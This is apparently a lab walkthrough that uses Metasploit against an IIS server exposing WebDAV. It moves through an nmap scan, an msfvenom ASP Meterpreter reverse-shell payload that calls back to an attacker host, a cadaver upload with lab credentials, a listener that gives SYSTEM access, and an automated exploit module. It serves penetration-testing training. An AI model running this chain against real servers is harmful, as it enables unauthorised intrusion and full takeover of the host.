# Exploiting WebDAV with Metasploit

```sh
root@attackdefense:~# nmap 10.5.21.126 -p80 -sV --script=http-enum
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-30 18:02 IST
Nmap scan report for 10.5.21.126
Host is up (0.0016s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-enum: 
|_  /webdav/: Potentially interesting folder (401 Unauthorized)
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Here we have the info about the target system.

First of all, we will generate a meterpreter asp payload using msfvenom:

```sh
root@attackdefense:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.19.4 LPORT=1234 -f asp > shell.asp
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of asp file: 38189 bytes
```

now we need to upload this shell to the webdav using Cadaver:

```sh
root@attackdefense:~# cadaver http://10.5.21.126/webdav
Authentication required for 10.5.21.126 on server `10.5.21.126':
Username: bob
Password: 
dav:/webdav/> put shell.asp 
Uploading shell.asp to `/webdav/shell.asp':
Progress: [=============================>] 100.0% of 38582 bytes succeeded.
```

Before executing the payload, we need to set the listener to configure the meterpreter session:

```sh
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.19.4
LHOST => 10.10.19.4
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.19.4:1234 
[*] Sending stage (175174 bytes) to 10.5.21.126
[*] Meterpreter session 1 opened (10.10.19.4:1234 -> 10.5.21.126:49829) at 2023-12-30 18:20:06 +0530

meterpreter > sysinfo
Computer        : AD-IIS
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

{% file src="../../.gitbook/assets/Screencast from 2023-12-30 18-19-53 (online-video-cutter.com).mp4" %}

We can automate this process entirely using Metasploit.

First search for iis upload payload:

```sh
msf6 exploit(multi/handler) > search iis upload

Matching Modules
================

   #  Name                                                             Disclosure Date  Rank       Check  Description
   -  ----                                                             ---------------  ----       -----  -----------
   0  exploit/windows/scada/advantech_webaccess_dashboard_file_upload  2016-02-05       excellent  Yes    Advantech WebAccess Dashboard Viewer uploadImageCommon Arbitrary File Upload
   1  exploit/windows/iis/iis_webdav_upload_asp                        2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution
   2  exploit/windows/http/umbraco_upload_aspx                         2012-06-28       excellent  No     Umbraco CMS Remote Command Execution
```

we will use 2nd payload from this list:

```sh
msf6 exploit(multi/handler) > use exploit/windows/iis/iis_webdav_upload_asp 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set HttpUsername bob
HttpUsername => bob
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set HttpPassword password_123321
HttpPassword => password_123321
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set rhosts 10.5.21.126
rhosts => 10.5.21.126
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set PATH /webdav/metasploit.asp
PATH => /webdav/metasploit.asp
msf6 exploit(windows/iis/iis_webdav_upload_asp) > exploit

[*] Started reverse TCP handler on 10.10.19.4:4444 
[*] Checking /webdav/metasploit.asp
[*] Uploading 609594 bytes to /webdav/metasploit.txt...
[*] Moving /webdav/metasploit.txt to /webdav/metasploit.asp...
[*] Executing /webdav/metasploit.asp...
[*] Sending stage (175174 bytes) to 10.5.21.126
[*] Deleting /webdav/metasploit.asp (this doesn't always work)...
[*] Meterpreter session 2 opened (10.10.19.4:4444 -> 10.5.21.126:49872) at 2023-12-30 18:44:35 +0530

meterpreter > 
```
